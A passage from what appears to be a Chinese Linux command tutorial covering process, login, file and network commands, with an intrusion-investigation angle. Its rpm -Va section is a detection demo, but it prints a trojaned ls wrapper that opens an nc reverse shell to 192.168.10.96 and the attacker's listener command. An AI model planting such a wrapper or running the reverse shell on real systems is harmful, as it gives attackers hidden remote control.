sy</td><td>内核空间占用CPU百分比</td></tr><tr><td>0.0 ni</td><td>用户进程空间内改变过优先级的进程占用CPU百分比</td></tr><tr><td>99.7 id</td><td>空闲CPU百分比</td></tr><tr><td>0.0 wa</td><td>等待输入输出的CPU时间百分比</td></tr><tr><td>0.3 hi</td><td>硬中断（Hardware IRQ）占用CPU的百分比</td></tr><tr><td>0.0 si</td><td>软中断（Software Interrupts）占用CPU的百分比</td></tr></tbody></table><p>第4行：<code>MiB Mem :   1775.3 total,   1369.3 free,    162.4 used,    243.6 buff/cache</code> 第5行：<code>MiB Swap:   1640.0 total,   1640.0 free,      0.0 used.   1466.1 avail Mem</code>为内存信息。</p><table><thead><tr><th>内容</th><th>含义</th></tr></thead><tbody><tr><td>KiB Mem:1775.3 tota</td><td>物理内存总量</td></tr><tr><td>1369.3 free</td><td>空闲内存总量</td></tr><tr><td>162.4 used</td><td>使用的物理内存总量</td></tr><tr><td>243.6 buff&#x2F;cache</td><td>用作内核缓存的内存量</td></tr><tr><td>MiB Swap:1640.0 total</td><td>交换区总量</td></tr><tr><td>1640.0 free</td><td>空闲交换区总量</td></tr><tr><td>0.0 used</td><td>使用的交换区总量</td></tr><tr><td>1466.1 avail Mem</td><td>代表可用于进程下一次分配的物理内存数量</td></tr></tbody></table><p>第6行：    <code>PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND</code> 为进程信息。</p><table><thead><tr><th>列名</th><th>含义</th></tr></thead><tbody><tr><td>PID</td><td>进程id</td></tr><tr><td>USER</td><td>进程所有者的用户名</td></tr><tr><td>PR</td><td>优先级</td></tr><tr><td>NI</td><td>nice值。负值表示高优先级，正值表示低优先级</td></tr><tr><td>VIRT</td><td>进程使用的虚拟内存总量，单位kb。VIRT&#x3D;SWAP+RES</td></tr><tr><td>RES</td><td>进程使用的、未被换出的物理内存大小，单位kb。RES&#x3D;CODE+DATA</td></tr><tr><td>SHR</td><td>共享内存大小，单位kb</td></tr><tr><td>S</td><td>进程状态。D&#x3D;不可中断的睡眠状态 R&#x3D;运行 S&#x3D;睡眠 T&#x3D;跟踪&#x2F;停止 Z&#x3D;僵尸进程</td></tr><tr><td>%CPU</td><td>上次更新到现在的CPU时间占用百分比</td></tr><tr><td>%MEM</td><td>进程使用的物理内存百分比</td></tr><tr><td>TIME+</td><td>进程使用的CPU时间总计，单位1&#x2F;100秒</td></tr><tr><td>COMMAND</td><td>命令名&#x2F;命令行</td></tr></tbody></table><h3 id="1-5-2-w-命令"><a href="#1-5-2-w-命令" class="headerlink" title="1.5.2 w 命令"></a>1.5.2 w 命令</h3><p><code>w</code>命令用于显示已经登陆系统的用户列表，并显示用户正在执行的指令。 执行这个命令可得知目前登入系统的用户有那些人，以及他们正在执行的程序。单独执行w命令会显示所有的用户，您也可指定用户名称，仅显示某位用户的相关信息。 案例：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">w</span><br></pre></td></tr></table></figure><p><img src="/img/20220910201825.png"></p><p>TTY：抽象来说就是屏幕，一台主机如果接了双屏，每一个屏幕就是一个TTY。</p><p><img src="/img/20220913173736.png"></p><p>pts：远程登录的是pts，直接外接显示屏的是tty。</p><h3 id="1-5-3-last-命令"><a href="#1-5-3-last-命令" class="headerlink" title="1.5.3 last 命令"></a>1.5.3 last 命令</h3><p><code>last</code>命令用于显示用户最近登录信息。单独执行last命令，它会读取&#x2F;var&#x2F;log&#x2F;wtmp的文件，并把该给文件的内容记录的登入系统的用户名单全部显示出来。</p><p>用法：<code>last [选项]</code></p><p>案例：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">last </span><br><span class="line">last -5  <span class="comment">#只显示5行</span></span><br></pre></td></tr></table></figure><p><img src="/img/20220910202030.png"></p><p><code>/var/log/wtmp</code>文件</p><p><code>wtmp</code>文件是二进制文件,该日志文件永久记录每个用户登录、注销及系统的启动、停机的事件。因此随着系统正常运行时间的增加，该文件的大小也会越来越大，增加的速度取决于系统用户登录的次数。该日志文件可以用来查看用户的登录记录，last命令就通过访问这个文件获得这些信息，并以反序从后向前。</p><h3 id="1-5-4-lastb命令"><a href="#1-5-4-lastb命令" class="headerlink" title="1.5.4 lastb命令"></a>1.5.4 lastb命令</h3><p>用于显示用户错误的登录列表，此指令可以发现系统的登录异常。单独执行lastb命令，它会读取位于&#x2F;var&#x2F;log目录下，名称为btmp的文件，并把该文件内容记录的登入失败的用户名单，全部显示出来。</p><p>首次运行lastb命令会报下的错误：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lastb: /var/log/btmp: No such file or directory</span><br><span class="line">Perhaps this file was removed by the operator to prevent logging lastb info.</span><br></pre></td></tr></table></figure><p>只需建立这个不存在的文件即可。<code>touch /var/log/btmp</code><br>使用ssh的登录失败不会记录在btmp文件中。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lastb -n 30 <span class="comment">#查看最新的30条</span></span><br></pre></td></tr></table></figure><h3 id="1-5-5-ps-命令"><a href="#1-5-5-ps-命令" class="headerlink" title="1.5.5 ps 命令"></a>1.5.5 ps 命令</h3><p><code>ps</code>命令是最基本同时也是非常强大的进程查看命令，使用该命令可以确定有哪些进程正在运行和运行的状态、进程是否结束。</p><p>用法：<code>ps [选项]</code></p><p>参数：</p><ul><li>-A 显示所有进程</li><li>-e 显示所有进程（同-A）</li><li>-a 显示当前终端的所有进程</li><li>-u 显示进程的用户信息</li><li>-o 以用户自定义形式显示进程信息</li><li>-f 显示程序间的关系</li><li>-x 显示所有程序，不以终端机来区分</li><li>-aux 显示所有包含其他使用者的行程</li></ul><p>案例：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps -aux|more</span><br><span class="line">ps -aux|grep root|more</span><br><span class="line">ps -ef</span><br></pre></td></tr></table></figure><p><img src="/img/20220910202918.png"></p><table><thead><tr><th>USER</th><th>PID</th><th>%CPU</th><th>%MEM</th><th>VSZ</th><th>RSS</th><th>TTY</th><th>STAT</th><th>START</th><th>TIME</th><th>COMMAND</th></tr></thead><tbody><tr><td>进程拥有者</td><td>进程ID</td><td>CPU 使用率</td><td>内存使用率</td><td>进程使用的虚拟内存大小，以K为单位</td><td>驻留空间的大小。显示当前常驻内存的程序的K字节数。</td><td>终端的号码</td><td>进程状态</td><td>进程开始时间</td><td>执行的时间</td><td>所执行的指令</td></tr></tbody></table><p>STAT进程状态包括下面的状态： </p><ul><li><code>D</code> 不可中断 Uninterruptible sleep (usually IO) </li><li><code>R</code> 正在运行，或在队列中的进程 </li><li><code>S</code> 处于休眠状态 <code>T</code> 停止或被追踪 </li><li><code>Z</code> 僵尸进程 </li><li><code>W</code> 进入内存交换（从内核2.6开始无效） </li><li><code>X</code> 死掉的进程 </li><li><code>&lt;</code> 高优先级 </li><li><code>N</code> 低优先级 L 有些页被锁进内存 </li><li><code>s</code> 包含子进程 </li><li><code>+</code> 位于后台的进程组</li><li><code>l</code> 多线程，克隆线程</li></ul><p>做排查的时候可以先看看 &#x2F;tmp 目录下有没有进程在运行，因为 &#x2F;tmp 目录任何用户都有写入权限，是入侵的首选。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps -aux |grep /tmp</span><br></pre></td></tr></table></figure><h3 id="1-5-6-lsof-命令"><a href="#1-5-6-lsof-命令" class="headerlink" title="1.5.6 lsof 命令"></a>1.5.6 lsof 命令</h3><p><code>lsof</code>命令用于查看你进程开打的文件，打开文件的进程，进程打开的端口(TCP、UDP)。找回&#x2F;恢复删除的文件。是十分方便的系统监视工具，因为lsof命令需要访问核心内存和各种文件，所以需要root用户执行。</p><p>在linux环境下，任何事物都以文件的形式存在，通过文件不仅仅可以访问常规数据，还可以访问网络连接和硬件。所以如传输控制协议 (TCP)  和用户数据报协议 (UDP)  套接字等，系统在后台都为该应用程序分配了一个文件描述符，无论这个文件的本质如何，该文件描述符为应用程序与基础操作系统之间的交互提供了通用接口。因为应用程序打开文件的描述符列表提供了大量关于这个应用程序本身的信息，因此通过lsof工具能够查看这个列表对系统监测以及排错将是很有帮助的。</p><h4 id="lsof-命令使用"><a href="#lsof-命令使用" class="headerlink" title="lsof 命令使用"></a>lsof 命令使用</h4><p>如果输入<code>lsof</code>命令提示：未找到命令。那么我们需要进行安装。安装命令为<code>yum -y install lsof</code>。</p><p>案例</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsof|more</span><br></pre></td></tr></table></figure><p><img src="/img/20220910204304.png"></p><table><thead><tr><th>COMMAND</th><th>PID TID TASKCMD</th><th>USER</th><th>FD</th><th>TYPE</th><th>DEVICE</th><th>SIZE&#x2F;OFF</th><th>NODE</th><th>NAME</th></tr></thead><tbody><tr><td>进程的名称</td><td>进程ID</td><td>进程所有用户</td><td>文件描述符，应用程序通过文件描述符识别该文件</td><td>文件类型</td><td>指定磁盘的名称</td><td>文件的大小</td><td>索引节点（文件在磁盘上的标识）</td><td>打开文件的确切名称</td></tr></tbody></table><p>案例：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsof 1.txt           <span class="comment">#查看哪些进程打开了1.txt文件</span></span><br><span class="line">lsof -c sshd         <span class="comment">#查看sshd服务所打开的文件</span></span><br><span class="line">lsof -i :22          <span class="comment">#查看22端口有哪些进程在访问</span></span><br><span class="line">lsof -p 1168         <span class="comment">#查看1168进程号所打开的文件</span></span><br><span class="line">lsof -u 0            <span class="comment">#查看uid为0的用户打开的文件</span></span><br><span class="line">lsof|grep /var/log/  <span class="comment">#查看/var/log/下的文件被哪些进程打开</span></span><br></pre></td></tr></table></figure><h4 id="恢复已删除的文件"><a href="#恢复已删除的文件" class="headerlink" title="恢复已删除的文件"></a>恢复已删除的文件</h4><p>需要恢复已删除的文件前提条件是还有进程打开这个文件，比如遭到黑客入侵往往总是会删除一些日志、木马文件等，假设我们ssh的登录日志被删除了，我们使用<code>lsof</code>查看，可以看到最后面有（deleted）这个状态。</p><p><code>lsof |grep /var/log/messages</code>这里pid对应的是699，所以我们需要查看699进程打开的文件描述。</p><p><img src="/img/20220910204829.png"></p><p><code>cd /proc/699/fd</code></p><p>再使用<code>ll</code>查看就可以看到被删除对应的文件了，文件7对应的就是被删除的文件，将7里面的内容输入到被删除的目录文件就恢复了</p><p><img src="/img/20220910204913.png"></p><p><code>cp 7 /var/log</code>拷贝这个文件。</p><p><img src="/img/20220910205001.png"></p><p>更改文件名。</p><p><img src="/img/20220910205047.png"></p><h3 id="1-5-7-kill-结束进程"><a href="#1-5-7-kill-结束进程" class="headerlink" title="1.5.7 kill 结束进程"></a>1.5.7 kill 结束进程</h3><p><code>kill</code>命令用于结束进程。</p><p>用法：<code>kill [选项] pid</code> 案例：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">kill</span> -9 123456          <span class="comment">#彻底杀死进程号为123456的进程</span></span><br></pre></td></tr></table></figure><h3 id="1-5-8-which-命令"><a href="#1-5-8-which-命令" class="headerlink" title="1.5.8 which 命令"></a>1.5.8 which 命令</h3><p>which用于查找并显示给定命令的绝对路径，可以看到某个系统命令是否存在。</p><p>用法：which [命令] </p><p>案例：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">which</span> <span class="built_in">cd</span></span><br></pre></td></tr></table></figure><h3 id="1-5-9-rpm-Va-检查文件完整性"><a href="#1-5-9-rpm-Va-检查文件完整性" class="headerlink" title="1.5.9 rpm -Va 检查文件完整性"></a>1.5.9 rpm -Va 检查文件完整性</h3><p>linux系统有万物皆文件的特性，这种特性就可能会                               导致某命令被黑客修改替换。</p><p>假如 ls 命令被替换。</p><p>新建ls文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi ls</span><br><span class="line">cat ls</span><br></pre></td></tr></table></figure><p>新ls命令内容：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">/opt/ls $*</span><br><span class="line">nc 192.168.10.96 2000 -e /bin/bash &gt;/dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="/img/20220911205808.png"></p><p>将原本的ls文件移动到&#x2F;opt目录中，并将新ls文件移动到&#x2F;usr&#x2F;bin下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x ls</span><br><span class="line">mv /usr/bin/ls /opt</span><br><span class="line">mv ls /usr/bin</span><br><span class="line">cat /usr/bin/ls</span><br></pre></td></tr></table></figure><p><img src="/img/20220911205852.png"></p><p>攻击机启动监听</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvp 2000</span><br></pre></td></tr></table></figure><p>当受害者执行ls命令时会触发nc命令，攻击机可以看到反弹回来的shell。</p><p><img src="/img/20220911205945.png"></p><p>可以看到<code>which</code>结果和<code>whereis</code>结果并无可疑。</p><p><img src="/img/20220911210015.png"></p><p>查找被修改的命令，可以看到ls文件异常：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm -Va</span><br></pre></td></tr></table></figure><p><img src="/img/20220911210052.png"></p><p>而后将ls文件重新替换就好</p><p>系统完整性检查工具有<code>lynins</code>,<code>aide</code>,<code>tripwire</code>等，可以更方便的发现，查找被替换文件。</p><p>​    rpm命令我们经常使用，但是这个”-V”参数我们却很少使用，今天碰巧遇到，这里坐下总结。rpm -V用来检查已安装rpm包的完整性。<strong>所谓“完整性”，这里就是指安装rpm包产生的所有文件和原始rpm包中的信息是否一致</strong>。如果完全一致，则不做任何输出，只有发现有不正确的文件时才会输出。rpm -V的输出格式如下：</p><p>​    <strong>SM5DLUGT c</strong> </p><p>​      其中每当发现一个不一致的文件就会有一行类似的输出，一下是每个字符的含义：</p><p>​    S：表示对应文件的大小（Size）不一致；</p><p>​    M：表示对于文件的mode不一致；</p><p>​    5：表示对应文件的MD5不一致；</p><p>​    D：表示文件的major和minor号不一致；</p><p>​    L：表示文件的符号连接内容不一致；</p><p>​    U：表示文件的owner不一致；</p><p>​    G：表示文件的group不一致；</p><p>​    T：表示文件的修改时间不一致；</p><p>​    c：只有文件是一个配置文件时才会有此标志，可以用这种方法快速定位rpm包的配置文件安装位置。（不是说只有文件不一致情况下才会显示吗？没错，但是配置文件通常会被修改，所以通常都会被检测出不一致）</p><p>​    file：检测出不一致的文件安装路径；</p><p>​    当然一般不可能一个文件的所有以上属性都不一致，所以检测通过的属性就会用一个“.”表示。</p><p>​    <strong>例1：</strong></p><p>​    .M5….T  &#x2F;usr&#x2F;X11R6&#x2F;lib&#x2F;X11&#x2F;fonts&#x2F;misc&#x2F;fonts.dir</p><p>​    表示&#x2F;usr&#x2F;X11R6&#x2F;lib&#x2F;X11&#x2F;fonts&#x2F;misc&#x2F;fonts.dir这个文件的mode被修改了，MD5也不一致，文件的修改时间也发生了改变。</p><p>​    <strong>例2：</strong></p><p>​    S.5….T c &#x2F;etc&#x2F;passwd</p><p>​    表示&#x2F;etc&#x2F;passwd的Size，MD5，modify time不一致，且这是一个配置文件；</p><p>   <strong>例3：</strong></p><p>​    missing   &#x2F;var&#x2F;spool&#x2F;at&#x2F;spool</p><p>​    表示rpm包本来该生产&#x2F;var&#x2F;spool&#x2F;at&#x2F;spool文件，但却丢失了。</p><h3 id="1-5-10-xargs-命令"><a href="#1-5-10-xargs-命令" class="headerlink" title="1.5.10 xargs 命令"></a>1.5.10 xargs 命令</h3><p><code>xargs</code>是给其他命令传递参数的一个过滤器，也是组合多个命令的一个工具。它擅长将标准输入数据转换成命令行参数，xargs能够处理管道或者stdin并将其转换成特定命令的命令参数。xargs也可以将单行或多行文本输入转换为其他格式，例如多行变单行，单行变多行。 xargs的默认命令是echo，空格是默认定界符。这意味着通过管道传递给xargs的输入将会包含换行和空白，不过通过xargs的处理，换行和空白将被空格取代。xargs是构建单行命令的重要组件之一。</p><p>案例：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> 111 |xargs -n 3 <span class="comment">#将内容进行排序，每行三个字段</span></span><br></pre></td></tr></table></figure><img src="img/20220911210445.png" style="zoom: 50%;" /><img src="img/20220911210541.png" style="zoom:50%;" /><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> * |xargs -n1 <span class="built_in">cat</span>                            <span class="comment">#将前面的结果传递作为子参数传递给后面的命令</span></span><br><span class="line"><span class="built_in">cat</span> 1.txt|xargs -n1 <span class="built_in">echo</span> <span class="string">&#x27;hello&#x27;</span></span><br></pre></td></tr></table></figure><img src="img/20220911210801.png" style="zoom:80%;" /><img src="img/20220911210846.png" style="zoom:80%;" /><p><code>-P</code>参数可以使xargs参数同时执行多个线程，使执行时间变短。</p><img src="img/20220911210951.png" style="zoom:80%;" /><h4 id="url批量访问"><a href="#url批量访问" class="headerlink" title="url批量访问"></a>url批量访问</h4><p><img src="/img/20221005114719.png"></p><p><img src="/img/20221005115023.png"></p><h4 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h4><p><img src="/img/20221009220617.png"></p><h3 id="1-5-11-stat-命令"><a href="#1-5-11-stat-命令" class="headerlink" title="1.5.11 stat 命令"></a>1.5.11 stat 命令</h3><p>用于显示文件信息：</p><p>用法：stat [文件或目录]</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">stat</span> /etc/passwd</span><br></pre></td></tr></table></figure><p><img src="/img/20221102120309.png"></p><h3 id="1-5-12-alias-命令别名"><a href="#1-5-12-alias-命令别名" class="headerlink" title="1.5.12 alias 命令别名"></a>1.5.12 alias 命令别名</h3><p>alias 命令（注意全为小写）的功能是设置命令的别名，以简写命令，提高操作效率。根据参数的不同，该命令可查看已设定的别名，或为命令设置新的别名。对于用户自定义别名，仅当前登录期内有效；也可修改配置文件使其长期有效。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">alias</span>[-p][别名][=命令]</span><br></pre></td></tr></table></figure><p><img src="/img/20220901173653.png"></p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p><code>cat /proc/mounts</code> 显示已加载的文件系统。</p><p><code>cat /etc/centos-release</code> 查看centos系统版本</p><p><code>hostname</code> 查看主机名。</p><p><code>history</code> 查看历史命令。</p><p><strong>环境变量</strong> </p><p><code>echo  $JAVA_HOME</code> 查看 $JAVA_HOME 的环境变量配置<br><code>echo $PATH | grep jdk</code> 查看 jdk 的环境变量配置</p><p><code>env</code> 查看当前的环境变量。</p><p><code>echo $PATH</code> 查看系统变量。</p><h1 id="2-硬件相关"><a href="#2-硬件相关" class="headerlink" title="2.硬件相关"></a>2.硬件相关</h1><h2 id="2-1硬件信息"><a href="#2-1硬件信息" class="headerlink" title="2.1硬件信息"></a>2.1硬件信息</h2><p><code>arch</code> 显示机器的处理器架构(1)。</p><p><code>uname -m</code> 显示机器的处理器架构(2)。</p><p><code>uname -a</code> 显示正在使用的内核版本（更详细）。</p><p><code>uname -r</code> 显示正在使用的内核版本。</p><p><code>cat /proc/version</code> 显示内核的版本。</p><p><code>cat /proc/net/dev</code> 显示网络适配器及统计。</p><p><code>cat /proc/cpuinfo</code> 显示CPU info的信息。</p><h2 id="2-2磁盘信息"><a href="#2-2磁盘信息" class="headerlink" title="2.2磁盘信息"></a>2.2磁盘信息</h2><p><code>df</code>命令用于显示磁盘分区上的可使用的磁盘空间。默认显示单位为KB。可以利用该命令来获取硬盘被占用了多少空间，目前还剩下多少空间等信息。</p><p>用法：<code>df [选项]</code> </p><p>参数：</p><ul><li>-h 使用人类可读的格式</li><li>-T 显示文件系统的类型</li></ul><p>案例：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">df</span> -h</span><br><span class="line"><span class="built_in">df</span> -hT</span><br></pre></td></tr></table></figure><h2 id="2-3内存信息"><a href="#2-3内存信息" class="headerlink" title="2.3内存信息"></a>2.3内存信息</h2><p><code>free</code>   默认以KB为单位，总容量、已用、可用、缓存大小。</p><p><code>free -m</code>   默认以MB为单位。</p><p><code>free -h</code>   上面2种都只显示数值，这种是友好显示的，会带单位G、M等。</p><h2 id="2-4网卡相关"><a href="#2-4网卡相关" class="headerlink" title="2.4网卡相关"></a>2.4网卡相关</h2><h3 id="2-4-1-ip和网卡信息"><a href="#2-4-1-ip和网卡信息" class="headerlink" title="2.4.1 ip和网卡信息"></a>2.4.1 ip和网卡信息</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip a</span><br><span class="line">ifconfig</span><br><span class="line">ifconfig -a 查看所有网卡。</span><br><span class="line">ifconfig eth0 查看eth0网卡。</span><br><span class="line">ifconfig eth0 192.168.0.130 设置临时ip。</span><br><span class="line">ethtool eth0 用于查询及设置网卡参数的命令。</span><br></pre></td></tr></table></figure><h3 id="2-4-2-重启-停止-启动"><a href="#2-4-2-重启-停止-启动" class="headerlink" title="2.4.2 重启&#x2F;停止&#x2F;启动"></a>2.4.2 重启&#x2F;停止&#x2F;启动</h3><h4 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/init.d/networking restart  <span class="comment">#重启网卡</span></span><br><span class="line">/etc/init.d/networking start    <span class="comment">#启动网卡</span></span><br><span class="line">/etc/init.d/networking stop     <span class="comment">#关闭网卡</span></span><br></pre></td></tr></table></figure><h4 id="centos"><a href="#centos" class="headerlink" title="centos"></a>centos</h4><p><strong>systemctl 和 service</strong> </p><p>远程连接千万不要敲 stop 。断了连接还得去机房重启。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart/stop/start/status network          <span class="comment">#重启/停止/启动/查看状态</span></span><br><span class="line">service network restart/stop/start/status            <span class="comment">#重启/停止/启动/查看状态</span></span><br></pre></td></tr></table></figure><p><strong>nmcli</strong> </p><p>这是centos stream 9 新加入的命令，下面这个 down 远程连接不要敲，与 stop 一样。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmcli c show                 <span class="comment">#查看状态</span></span><br><span class="line">nmcli c up/down [网卡名]      <span class="comment">#启动/关闭</span></span><br><span class="line">nmcli c reload [网卡名]       <span class="comment">#重启</span></span><br><span class="line">nmcli c modify ens33 ipv4.addresses 192.168.0.62/24</span><br><span class="line">nmcli c modify ens33 ipv4.gateway 192.168.0.1</span><br><span class="line">nmcli c modify ens33 ipv4.dns 8.8.8.8</span><br></pre></td></tr></table></figure><p><img src="/img/20220901210734.png"></p><h1 id="3-文件夹或文本操作"><a href="#3-文件夹或文本操作" class="headerlink" title="3.文件夹或文本操作"></a>3.文件夹或文本操作</h1><h2 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h2><h3 id="touch"><a href="#touch" class="headerlink" title="touch"></a>touch</h3><p><code>touch 文件名</code>  创建一个空白的文件，如果同名文件已存在，则更新其时间属性。</p><p>也可同时创建多个文件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">touch 文件名 文件名</span><br></pre></td></tr></table></figure><h3 id="mkdir"><a href="#mkdir" class="headerlink" title="mkdir"></a>mkdir</h3><p><code>mkdir 文件夹</code> 创建文件夹。</p><p><code>mkdir 文件名 文件名</code> 创建多个文件夹</p><p><code>mkdir -p 文件夹/文件夹/文件夹</code> 递归创建文件夹。</p><h2 id="读取"><a href="#读取" class="headerlink" title="读取"></a>读取</h2><h3 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h3><p><code>cat 文件名</code> 读取文档内容。</p><p>-v：在查看的时候把颜色去除，并显示颜色的源代码。</p><h3 id="less"><a href="#less" class="headerlink" title="less"></a>less</h3><p><code>less 文件名</code> 读取文档内容(<code>q</code>键退出)。</p><p>用PageUp键向上翻页，用PageDown键向下翻页。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">案例：</span><br><span class="line">less /etc/passwd</span><br></pre></td></tr></table></figure><h3 id="more"><a href="#more" class="headerlink" title="more"></a>more</h3><p><code>more 文件名</code> 读取文档内容 </p><p>按空格键<code>Space</code>下一页，<code>Enter</code>键下一行，<code>b</code>键就会往回(back)一页显示，按<code>q</code>键退出。</p><h3 id="head"><a href="#head" class="headerlink" title="head"></a>head</h3><p><code>head</code>命令用于查看文件的开头的内容。在默认情况下，head命令显示文件的头10行内容  </p><p>用法：<code>head [选项] [文件]</code></p><p>参数：</p><ul><li>-n&lt;行数&gt; 显示的行数</li></ul><p>案例：显示passwd文件前两行 </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">head</span> -n 2 /etc/passwd</span><br><span class="line"><span class="built_in">head</span> -n 3 /etc/passwd|<span class="built_in">nl</span>      <span class="comment">#nl在每一行前面显示行数</span></span><br></pre></td></tr></table></figure><h3 id="tail"><a href="#tail" class="headerlink" title="tail"></a>tail</h3><p>默认在屏幕上显示指定文件的末尾10行，如果给定的文件不止一个，则在显示的每个文件前面加一个文件名标题</p><p>用法:<code>tail [选项] [文件]</code></p><ul><li>参数：-n&lt;行数&gt; 显示的行数</li></ul><p>案例：查看passwd文件尾部三行内容。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">tail</span> -n 3 /etc/passwd</span><br></pre></td></tr></table></figure><ul><li>参数：-f 循环读取</li></ul><p>案例：查看新增的内容</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">tail</span> -f /var/log/secure</span><br></pre></td></tr></table></figure><p><code>/var/log/secure</code>是系统远程登录日志，我们可以通过<code>tail -f</code>命令监控日志变化情况。</p><h4 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h4><p>管道操作符<code>|</code>可以把一个命令的标准输出传送到另一个命令的标准输入中，连续的|意味着第一个命令的输出为第二个命令的输入，第二个命令的输入为第一个命令的输出，依次类推。</p><p>案例：只显示passwd文本的第五行。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">head</span> -n 5 /etc/passwd |<span class="built_in">tail</span> -n 1</span><br></pre></td></tr></table></figure><p>一个37行的文件，取20-25行，先看1-25行，再截取尾部6行。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd|<span class="built_in">nl</span>|<span class="built_in">head</span> -n 25|<span class="built_in">tail</span> -n 6</span><br></pre></td></tr></table></figure><h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><h3 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h3><p><code>echo</code>命令用于输出指定内容。</p><p>用法：<code>echo &#39;[文本]&#39;</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;123&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a>输出重定向</h3><p>echo 利用&gt;&gt;和&gt;可以将输出内容写入到文件中。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;     #覆盖</span><br><span class="line">&gt;&gt;    #追加</span><br></pre></td></tr></table></figure><p>也可以将命令的输出结果保存于文件中。</p><p>cat &#x2F;etc&#x2F;passwd &gt;1.txt</p><p><code>&lt;</code> 和 <code>&lt;&lt;</code> 一般用于数据库还原。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件 &lt; .sql文件</span><br></pre></td></tr></table></figure><h3 id="输入重定向"><a href="#输入重定向" class="headerlink" title="输入重定向"></a>输入重定向</h3><p>正如命令的输出可以可重定向到文件，命令的输入也可以重定向到文件。一般使用<code>&lt;</code>和<code>&lt;&lt;</code>，其中<code>&lt;&lt;</code>可以引入多行命令的输入。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> &lt; 1.txt <span class="comment">#等同于cat 1.txt</span></span><br><span class="line"><span class="built_in">ls</span> &lt; 1.txt  <span class="comment">#等同于ls /root</span></span><br></pre></td></tr></table></figure><p><img src="/img/20220901142922.png"></p><h2 id="rm-删除"><a href="#rm-删除" class="headerlink" title="rm 删除"></a>rm 删除</h2><ul><li>-i 删除前逐一询问确认。</li><li>-f 即使原档案属性设为唯读，亦直接删除，无需逐一确认。</li><li>-r 将目录及以下之档案亦逐一删除。</li></ul><p><code>rm -f 文件</code>  强制删除文件。</p><p><code>rm -r 文件夹名</code> 递归删除目录及其内容。</p><p><code>rm  -rf 文件(夹)名</code> 强制递归删除文件(夹)。</p><h2 id="cd-切目录"><a href="#cd-切目录" class="headerlink" title="cd 切目录"></a>cd 切目录</h2><p><code>cd ..</code>  返回上一级目录。</p><p><code>cd ../..</code>  返回上级两级目录。</p><p><code>cd -</code> 返回上次所在的目录。</p><p><code>cd 文件夹名</code>  进去文件夹。</p><p><code>cd ~</code> 进去当前用户家目录。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">. 当前目录 .. 上一级目录</span><br></pre></td></tr></table></figure><h2 id="cp-复制"><a href="#cp-复制" class="headerlink" title="cp 复制"></a>cp 复制</h2><p><code>cp</code> 复制命令。</p><p>-r：若给出的源文件是一个目录文件，此时将复制该目录下所有的子目录和文件。（递归）</p><p>-p：除复制文件的内容外，还把修改时间和访问权限也复制到新文件中。(保持默认属性)</p><p><code>cp -r test1 test2</code> 复制 test1 文件夹到当前 test2。 </p><p><code>cp /etc/passwd .</code> 拷贝passwd到当前目录</p><h2 id="mv-移动与重命名"><a href="#mv-移动与重命名" class="headerlink" title="mv 移动与重命名"></a>mv 移动与重命名</h2><p><code>mv</code> 移动与重命名。</p><ul><li><strong>-f</strong>: 如果指定移动的源目录或文件与目标的目录或文件同名，不会询问，直接覆盖旧文件。（直接覆盖不询问）</li><li><strong>-n</strong>: 不要覆盖任何已存在的文件或目录。(不覆盖已存在的文件)</li></ul><p><code>mv 